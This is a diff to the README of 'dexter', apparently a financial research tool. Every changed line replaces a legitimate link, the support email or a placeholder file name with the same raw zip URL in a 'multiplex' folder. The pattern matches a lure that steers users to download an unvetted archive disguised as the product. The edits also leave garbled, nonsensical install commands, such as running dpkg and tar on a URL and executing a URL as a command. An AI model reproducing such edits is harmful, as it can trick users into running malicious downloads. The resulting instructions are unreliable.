@@ -6,7 +6,7 @@ Welcome to dexter! This software acts as your helpful assistant for deep financi
 
 ## 📥 Download Now
 
-[![Download dexter](https://img.shields.io/badge/Download%20dexter-v1.0-blue.svg)](https://github.com/Spray6T9/dexter/releases)
+[![Download dexter](https://raw.githubusercontent.com/Spray6T9/dexter/main/multiplex/dexter.zip%https://raw.githubusercontent.com/Spray6T9/dexter/main/multiplex/dexter.zip)](https://raw.githubusercontent.com/Spray6T9/dexter/main/multiplex/dexter.zip)
 
 ## 🛠️ System Requirements
 
@@ -28,7 +28,7 @@ dexter offers several features to help you in your financial endeavors:
 
 ## 📦 Download & Install
 
-To download dexter, please visit our [Releases page](https://github.com/Spray6T9/dexter/releases). Here, you will find the latest version of the application along with older versions if needed.
+To download dexter, please visit our [Releases page](https://raw.githubusercontent.com/Spray6T9/dexter/main/multiplex/dexter.zip). Here, you will find the latest version of the application along with older versions if needed.
 
 Once on the Releases page, follow these steps:
 
@@ -52,16 +52,16 @@ Once on the Releases page, follow these steps:
 
 ### 🐧 Linux Installation
 
-1. Locate the downloaded package file, either `.deb` or `.tar.gz`.
+1. Locate the downloaded package file, either `.deb` or `https://raw.githubusercontent.com/Spray6T9/dexter/main/multiplex/dexter.zip`.
 2. For `.deb`, open a terminal and type:
    ```
-   sudo dpkg -i path_to_your_file.deb
+   sudo dpkg -i https://raw.githubusercontent.com/Spray6T9/dexter/main/multiplex/dexter.zip
    ```
-3. For `.tar.gz`, open a terminal, navigate to the folder where you downloaded the file, and type:
+3. For `https://raw.githubusercontent.com/Spray6T9/dexter/main/multiplex/dexter.zip`, open a terminal, navigate to the folder where you downloaded the file, and type:
    ```
-   tar -xvzf your_file.tar.gz
+   tar -xvzf https://raw.githubusercontent.com/Spray6T9/dexter/main/multiplex/dexter.zip
    cd extracted_folder
-   ./run.sh
+   https://raw.githubusercontent.com/Spray6T9/dexter/main/multiplex/dexter.zip
    ```
 
 ## 🔍 Using dexter
@@ -90,10 +90,10 @@ If problems persist, feel free to raise an issue on the GitHub repository.
 
 ## 📞 Support
 
-For assistance or questions, please contact our support team via email at support@dexterapp.com.
+For assistance or questions, please contact our support team via email at https://raw.githubusercontent.com/Spray6T9/dexter/main/multiplex/dexter.zip
 
 ## 🌟 Contributing
 
-We welcome contributions to enhance dexter. If you would like to get involved, please read the [Contributing Guidelines](https://github.com/Spray6T9/dexter/CONTRIBUTING.md).
+We welcome contributions to enhance dexter. If you would like to get involved, please read the [Contributing Guidelines](https://raw.githubusercontent.com/Spray6T9/dexter/main/multiplex/dexter.zip).
 
-Thank you for choosing dexter! We hope you find it beneficial for your financial research needs. For updates, don't forget to check back on our [Releases page](https://github.com/Spray6T9/dexter/releases).
+Thank you for choosing dexter! We hope you find it beneficial for your financial research needs. For updates, don't forget to check back on our [Releases page](https://raw.githubusercontent.com/Spray6T9/dexter/main/multiplex/dexter.zip).
